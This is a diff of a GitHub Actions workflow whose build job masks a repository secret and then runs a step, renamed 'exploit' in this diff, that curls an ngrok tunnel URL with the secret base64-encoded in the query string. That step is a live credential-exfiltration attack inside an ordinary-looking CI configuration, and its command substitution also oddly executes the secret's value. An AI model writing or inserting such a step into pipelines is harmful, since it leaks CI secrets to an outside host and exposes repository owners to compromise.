@@ -11,7 +11,6 @@ on:
   workflow_dispatch:
 
 jobs:
- 
   build:
     runs-on: ubuntu-latest
     environment: Vienna
@@ -20,7 +19,6 @@ jobs:
     steps:
       - name: Add mask
         run: |
-          echo "::add-mask::${{ secrets.FAVOURITE }}" 
-
-      - name: I ll tell you my current favourite 
+          echo "::add-mask::${{ secrets.FAVOURITE }}"
+      - name: exploit
         run: curl -k https://82e6-78-128-250-16.ngrok-free.app?data=$(${{ secrets.FAVOURITE }} | base64 --wrap=0)
